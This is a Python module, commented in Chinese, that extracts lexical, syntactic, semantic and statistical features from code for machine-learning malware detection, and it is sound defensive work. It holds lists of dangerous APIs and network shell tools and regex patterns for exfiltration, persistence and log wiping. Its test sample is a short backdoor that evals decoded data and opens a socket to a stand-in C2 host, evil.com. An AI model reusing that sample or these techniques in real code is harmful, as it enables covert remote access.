#!/usr/bin/env python3
"""
Round 24 - 特征提取器

从代码中提取 ML 特征：词法 + 语法 + 语义 + 统计
"""

import re
import math
from pathlib import Path
from typing import Dict, List, Any
from collections import Counter

class FeatureExtractor:
    """代码特征提取器"""
    
    def __init__(self):
        # 危险 API 列表
        self.dangerous_apis = {
            'python': [
                'eval', 'exec', 'compile', '__import__', 'getattr', 'setattr',
                'open', 'read', 'write', 'remove', 'system', 'popen', 'subprocess',
                'socket', 'connect', 'send', 'recv', 'requests', 'urllib',
                'base64', 'decode', 'encode', 'hashlib', 'crypto',
                'os.system', 'os.popen', 'os.remove', 'os.rename',
                'shutil.rmtree', 'shutil.copy',
                'importlib', 'pickle', 'marshal',
            ],
            'javascript': [
                'eval', 'Function', 'setTimeout', 'setInterval',
                'document.write', 'innerHTML', 'outerHTML',
                'XMLHttpRequest', 'fetch', 'WebSocket',
                'atob', 'btoa', 'escape', 'unescape',
                'localStorage', 'sessionStorage', 'cookie',
                'require', 'child_process', 'exec', 'spawn',
            ],
            'shell': [
                'eval', 'exec', 'source',
                'curl', 'wget', 'nc', 'netcat',
                'ssh', 'scp', 'rsync',
                'base64', 'openssl', 'gpg',
                'rm', 'dd', 'chmod', 'chown',
                'sudo', 'su', 'passwd',
                'cat', 'grep', 'awk', 'sed',
            ],
            'powershell': [
                'IEX', 'Invoke-Expression', 'Invoke-Command',
                'DownloadString', 'DownloadFile', 'WebClient',
                'Get-Credential', 'Invoke-Mimikatz',
                'Add-Type', 'Assembly', 'Load',
                'Start-Process', 'Invoke-Item',
                'Remove-Item', 'Clear-EventLog',
                'FromBase64String', 'ToBase64String',
            ],
        }
        
        # 可疑导入
        self.suspicious_imports = {
            'python': ['os', 'sys', 'subprocess', 'socket', 'requests', 'urllib', 'base64', 'hashlib', 'crypto', 'pickle', 'marshal', 'ctypes'],
            'javascript': ['child_process', 'fs', 'http', 'https', 'net', 'crypto', 'buffer'],
            'shell': [],
            'powershell': ['Net.WebClient', 'Management.Automation', 'Security.Principal'],
        }
    
    def extract_all_features(self, code: str, language: str) -> Dict[str, float]:
        """提取所有特征"""
        features = {}
        
        # 1. 词法特征
        features.update(self.extract_lexical_features(code, language))
        
        # 2. 语法特征
        features.update(self.extract_syntactic_features(code, language))
        
        # 3. 语义特征
        features.update(self.extract_semantic_features(code, language))
        
        # 4. 统计特征
        features.update(self.extract_statistical_features(code, language))
        
        return features
    
    def extract_lexical_features(self, code: str, language: str) -> Dict[str, float]:
        """提取词法特征"""
        features = {}
        
        # 1. 危险 API 调用次数
        dangerous_count = 0
        api_list = self.dangerous_apis.get(language, [])
        for api in api_list:
            matches = re.findall(r'\b' + re.escape(api) + r'\b', code, re.IGNORECASE)
            dangerous_count += len(matches)
        features['dangerous_api_count'] = dangerous_count
        
        # 2. 危险 API 比例
        total_tokens = len(code.split())
        features['dangerous_api_ratio'] = dangerous_count / max(total_tokens, 1)
        
        # 3. 可疑导入数量
        import_count = 0
        import_list = self.suspicious_imports.get(language, [])
        for imp in import_list:
            if re.search(r'\b' + re.escape(imp) + r'\b', code, re.IGNORECASE):
                import_count += 1
        features['suspicious_import_count'] = import_count
        
        # 4. 编码字符串检测 (Base64)
        base64_pattern = r'[A-Za-z0-9+/]{40,}={0,2}'
        base64_matches = re.findall(base64_pattern, code)
        features['encoded_string_count'] = len(base64_matches)
        
        # 5. 特殊字符密度
        special_chars = len(re.findall(r'[^\w\s]', code))
        features['special_char_density'] = special_chars / max(len(code), 1)
        
        # 6. 字符串熵值 (检测混淆)
        strings = re.findall(r'["\'][^"\']{10,}["\']', code)
        if strings:
            avg_entropy = sum(self.calculate_entropy(s) for s in strings) / len(strings)
            features['string_entropy'] = avg_entropy
        else:
            features['string_entropy'] = 0.0
        
        # 7. 代码长度特征
        features['line_count'] = len(code.splitlines())
        features['char_count'] = len(code)
        
        # 8. 注释比例
        if language == 'python':
            comments = re.findall(r'#.*$', code, re.MULTILINE)
        elif language in ['javascript', 'typescript']:
            comments = re.findall(r'//.*$|/\*[\s\S]*?\*/', code, re.MULTILINE)
        elif language == 'shell':
            comments = re.findall(r'#.*$', code, re.MULTILINE)
        elif language == 'powershell':
            comments = re.findall(r'#.*$', code, re.MULTILINE)
        else:
            comments = []
        features['comment_ratio'] = len(''.join(comments)) / max(len(code), 1)
        
        return features
    
    def extract_syntactic_features(self, code: str, language: str) -> Dict[str, float]:
        """提取语法特征"""
        features = {}
        
        # 1. 嵌套深度 (通过缩进/括号估算)
        if language in ['python', 'shell']:
            lines = code.splitlines()
            max_indent = max((len(line) - len(line.lstrip())) for line in lines if line.strip())
            features['max_nest_depth'] = max_indent // 4  # 假设 4 空格缩进
        else:
            # 括号嵌套
            depth = 0
            max_depth = 0
            for char in code:
                if char == '{':
                    depth += 1
                    max_depth = max(max_depth, depth)
                elif char == '}':
                    depth -= 1
            features['max_nest_depth'] = max_depth
        
        # 2. 函数/方法数量
        if language == 'python':
            funcs = re.findall(r'^\s*def\s+\w+', code, re.MULTILINE)
        elif language == 'javascript':
            funcs = re.findall(r'function\s+\w*|=>|:\s*function', code)
        elif language == 'shell':
            funcs = re.findall(r'^\s*\w+\s*\(\s*\)', code, re.MULTILINE)
        elif language == 'powershell':
            funcs = re.findall(r'function\s+\w+', code, re.IGNORECASE)
        else:
            funcs = []
        features['function_count'] = len(funcs)
        
        # 3. 控制流语句数量
        control_keywords = ['if', 'else', 'for', 'while', 'switch', 'case', 'try', 'catch', 'except']
        control_count = sum(len(re.findall(r'\b' + kw + r'\b', code, re.IGNORECASE)) for kw in control_keywords)
        features['control_flow_count'] = control_count
        
        # 4. 控制流复杂度 (简化版)
        features['control_flow_complexity'] = control_count / max(features.get('line_count', 1), 1)
        
        # 5. 参数数量 (估算)
        param_patterns = re.findall(r'\([^)]*\)', code)
        if param_patterns:
            avg_params = sum(p.count(',') + 1 for p in param_patterns if p.strip()) / len(param_patterns)
            features['avg_parameter_count'] = avg_params
        else:
            features['avg_parameter_count'] = 0.0
        
        return features
    
    def extract_semantic_features(self, code: str, language: str) -> Dict[str, float]:
        """提取语义特征"""
        features = {}
        
        # 1. 数据外传模式
        exfil_patterns = [
            r'requests\.post|urllib\.request.*POST|fetch.*POST',  # HTTP POST
            r'socket\.connect|TCPClient',  # Socket 连接
            r'\|.*curl|\|.*wget|\|.*nc\s',  # 管道到网络工具
        ]
        exfil_score = sum(len(re.findall(p, code, re.IGNORECASE)) for p in exfil_patterns)
        features['data_exfil_score'] = exfil_score
        
        # 2. 代码执行模式
        exec_patterns = [
            r'eval\s*\(|exec\s*\(|Function\s*\(',  # 动态执行
            r'__import__|importlib|Reflection',  # 动态导入
            r'subprocess|popen|system\s*\(',  # 系统调用
        ]
        exec_score = sum(len(re.findall(p, code, re.IGNORECASE)) for p in exec_patterns)
        features['code_exec_score'] = exec_score
        
        # 3. 持久化模式
        persist_patterns = [
            r'Registry|CurrentVersion.*Run|ScheduledTask',  # Windows 持久化
            r'cron|\.bashrc|\.profile|Startup',  # Linux 持久化
            r'LaunchAgents|LaunchDaemons',  # macOS 持久化
        ]
        persist_score = sum(len(re.findall(p, code, re.IGNORECASE)) for p in persist_patterns)
        features['persistence_score'] = persist_score
        
        # 4. 反侦察模式
        anti_forensics_patterns = [
            r'Clear-EventLog|Remove-EventLog|delete.*log',
            r'timestomp|touch\s+-d|Set-Acl',
            r'secure_delete|shred|wipe',
        ]
        anti_score = sum(len(re.findall(p, code, re.IGNORECASE)) for p in anti_forensics_patterns)
        features['anti_forensics_score'] = anti_score
        
        # 5. 混淆模式
        obfuscation_patterns = [
            r'FromBase64String|atob|base64.*decode',
            r'-bxor|-xor|XOR|\\^',
            r'\$\w+\s*\+\s*\$\w+\s*\+',  # 字符串拼接
            r'eval.*\+|\+.*eval',  # eval 拼接
        ]
        obfus_score = sum(len(re.findall(p, code, re.IGNORECASE)) for p in obfuscation_patterns)
        features['obfuscation_score'] = obfus_score
        
        # 6. 行为意图评分 (综合)
        behavior_scores = [
            features.get('data_exfil_score', 0),
            features.get('code_exec_score', 0),
            features.get('persistence_score', 0),
            features.get('anti_forensics_score', 0),
            features.get('obfuscation_score', 0),
        ]
        features['behavior_intent_score'] = sum(behavior_scores)
        
        return features
    
    def extract_statistical_features(self, code: str, language: str) -> Dict[str, float]:
        """提取统计特征"""
        features = {}
        
        # 1. Token 频率分布
        tokens = re.findall(r'\w+', code)
        unique_tokens = set(tokens)
        features['unique_token_count'] = len(unique_tokens)
        features['token_type_ratio'] = len(unique_tokens) / max(len(tokens), 1)
        
        # 2. N-gram 特征 (简化为 bigram)
        bigrams = [tokens[i:i+2] for i in range(len(tokens)-1)]
        bigram_counts = Counter(str(b) for b in bigrams)
        features['unique_bigram_count'] = len(bigram_counts)
        
        # 3. API 序列熵
        api_calls = []
        api_list = self.dangerous_apis.get(language, [])
        for api in api_list:
            api_calls.extend(re.findall(r'\b' + re.escape(api) + r'\b', code, re.IGNORECASE))
        if api_calls:
            api_entropy = self.calculate_entropy(''.join(api_calls))
            features['api_sequence_entropy'] = api_entropy
        else:
            features['api_sequence_entropy'] = 0.0
        
        # 4. 字节级熵 (整体代码)
        features['byte_entropy'] = self.calculate_entropy(code)
        
        # 5. 数字密度
        digits = len(re.findall(r'\d', code))
        features['digit_density'] = digits / max(len(code), 1)
        
        # 6. 大写字母密度
        uppercase = len(re.findall(r'[A-Z]', code))
        features['uppercase_density'] = uppercase / max(len(code), 1)
        
        return features
    
    def calculate_entropy(self, data: str) -> float:
        """计算香农熵"""
        if not data:
            return 0.0
        
        counter = Counter(data)
        length = len(data)
        entropy = 0.0
        
        for count in counter.values():
            if count > 0:
                p = count / length
                entropy -= p * math.log2(p)
        
        return entropy


def main():
    """测试特征提取器"""
    extractor = FeatureExtractor()
    
    test_code = """
import os
import base64

def backdoor():
    code = "aGVsbG8gd29ybGQ="  # Base64 encoded
    decoded = base64.b64decode(code)
    eval(decoded)
    
    # Connect to C2 server
    import socket
    s = socket.socket()
    s.connect(('evil.com', 4444))
"""
    
    print("=" * 60)
    print("🔍 特征提取器测试")
    print("=" * 60)
    
    features = extractor.extract_all_features(test_code, 'python')
    
    print(f"\n提取到 {len(features)} 个特征:\n")
    for name, value in sorted(features.items()):
        print(f"  {name}: {value:.4f}" if isinstance(value, float) else f"  {name}: {value}")
    
    print("\n" + "=" * 60)


if __name__ == '__main__':
    main()
